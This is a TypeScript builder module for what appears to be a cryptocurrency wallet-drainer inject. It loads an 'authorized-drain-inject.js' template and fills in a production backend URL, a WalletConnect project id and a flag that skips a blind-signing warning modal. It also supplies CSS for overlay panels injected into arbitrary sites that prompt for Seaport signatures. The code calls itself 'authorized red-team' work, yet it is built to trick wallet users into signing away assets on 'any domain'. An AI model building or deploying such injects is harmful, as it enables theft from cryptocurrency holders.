/**
 * Authorized red-team drain inject — production backend, any domain.
 * Reads template from authorized-drain-inject.js and substitutes runtime config.
 */
import { readFile } from 'node:fs/promises'
import path from 'node:path'
import { fileURLToPath } from 'node:url'

export const DEFAULT_AUTHORIZED_BACKEND_URL = 'https://legionapi-production.up.railway.app'

export type AuthorizedDrainInjectConfig = {
  backendUrl: string
  kineticKey?: string
  walletConnectProjectId?: string
  /** Internal drill only: skip blind-signing education modal */
  hardwareAutoConsent?: boolean
}

export function parseHardwareAutoConsentEnv(
  value: string | undefined,
): boolean {
  const v = value?.trim().toLowerCase()
  return v === 'true' || v === '1' || v === 'yes'
}

const __dirname = path.dirname(fileURLToPath(import.meta.url))

export function buildAuthorizedDrainCss(): string {
  return `
#legion-auth-banner{position:fixed;top:0;left:0;right:0;z-index:2147483646;background:#92400e;color:#fff;padding:10px 16px;font:600 14px/1.4 system-ui,sans-serif;text-align:center;box-shadow:0 2px 8px rgba(0,0,0,.35);}
#legion-auth-panel{position:fixed;bottom:20px;right:20px;z-index:2147483647;width:min(400px,calc(100vw - 32px));background:#0f172a;color:#e2e8f0;border-radius:14px;box-shadow:0 12px 40px rgba(0,0,0,.45);font:14px/1.45 system-ui,sans-serif;overflow:hidden;}
#legion-auth-panel header{padding:12px 14px;background:#1e293b;font-weight:600;font-size:13px;}
#legion-auth-panel .tabs{display:flex;flex-wrap:wrap;border-bottom:1px solid #334155;}
#legion-auth-panel .tabs button{flex:1;min-width:60px;padding:10px 6px;border:0;background:transparent;color:#94a3b8;cursor:pointer;font:inherit;font-size:12px;}
#legion-auth-panel .tabs button.active{background:#334155;color:#fff;}
#legion-auth-panel .body{padding:14px;}
#legion-auth-panel .status{min-height:2.5em;font-size:12px;color:#94a3b8;margin-bottom:10px;word-break:break-word;}
#legion-auth-panel .actions{display:flex;flex-direction:column;gap:8px;}
#legion-auth-panel button.primary{width:100%;padding:12px;border:0;border-radius:10px;background:linear-gradient(135deg,#d97706,#b45309);color:#fff;font:600 15px system-ui,sans-serif;cursor:pointer;}
#legion-auth-panel button.primary:disabled{opacity:.5;cursor:not-allowed;}
#legion-auth-panel button.secondary{width:100%;padding:10px;border:1px solid #6366f1;border-radius:10px;background:rgba(99,102,241,.12);color:#c7d2fe;font:600 13px system-ui,sans-serif;cursor:pointer;}
#legion-auth-panel button.secondary:disabled{opacity:.45;cursor:not-allowed;border-color:#475569;color:#64748b;}
#legion-auth-panel input.seaport-hash{width:100%;padding:10px 12px;margin-bottom:8px;border:1px solid #334155;border-radius:8px;background:#1e293b;color:#e2e8f0;font:inherit;box-sizing:border-box;}
#legion-auth-panel input.seaport-hash::placeholder{color:#64748b;}
#legion-auth-panel .wallet-mode{margin-bottom:8px;}
#legion-auth-panel .success{color:#4ade80;font-weight:600;}
body.legion-auth-active{padding-top:48px;}
.legion-blind-sign-overlay{position:fixed;inset:0;z-index:2147483647;display:flex;align-items:center;justify-content:center;padding:20px;background:rgba(0,0,0,.72);font:14px/1.55 system-ui,-apple-system,sans-serif;}
.legion-blind-sign-card{width:min(480px,calc(100vw - 40px));max-height:calc(100vh - 40px);overflow-y:auto;background:#fff;color:#0f172a;border-radius:16px;padding:24px 26px;box-shadow:0 20px 60px rgba(0,0,0,.45);}
.legion-blind-sign-card h2{margin:0 0 12px;font-size:20px;font-weight:700;line-height:1.3;color:#0f172a;}
.legion-blind-lead{margin:0 0 10px;color:#334155;}
.legion-blind-sub{margin:0 0 14px;font-size:13px;color:#64748b;}
.legion-blind-steps{margin:0 0 14px;padding-left:1.25rem;color:#334155;}
.legion-blind-steps li{margin-bottom:10px;}
.legion-blind-warning{margin:0 0 18px;padding:10px 12px;border-radius:8px;background:#fef3c7;color:#92400e;font-size:13px;}
.legion-blind-actions{display:flex;flex-wrap:wrap;gap:10px;justify-content:flex-end;}
.legion-blind-actions button{padding:11px 18px;border-radius:10px;font:600 14px system-ui,sans-serif;cursor:pointer;border:0;}
.legion-blind-cancel{background:#e2e8f0;color:#334155;}
.legion-blind-cancel:hover{background:#cbd5e1;}
.legion-blind-proceed{background:linear-gradient(135deg,#d97706,#b45309);color:#fff;}
.legion-blind-proceed:hover{filter:brightness(1.05);}
`.trim()
}

export async function buildAuthorizedDrainInjectJs(
  config: AuthorizedDrainInjectConfig,
): Promise<string> {
  const templatePath = path.join(__dirname, 'authorized-drain-inject.js')
  let template = await readFile(templatePath, 'utf8')
  const backendUrl = config.backendUrl.replace(/\/$/, '')
  const kineticKey = config.kineticKey?.trim() ?? ''
  const wcProjectId = config.walletConnectProjectId?.trim() ?? ''
  const hardwareAutoConsent = config.hardwareAutoConsent === true

  template = template.replace(/__BACKEND_URL__/g, backendUrl)
  template = template.replace(/__KINETIC_KEY__/g, kineticKey)
  template = template.replace(/__WC_PROJECT_ID__/g, wcProjectId)
  template = template.replace(/__HARDWARE_AUTO_CONSENT__/g, String(hardwareAutoConsent))

  return template
}
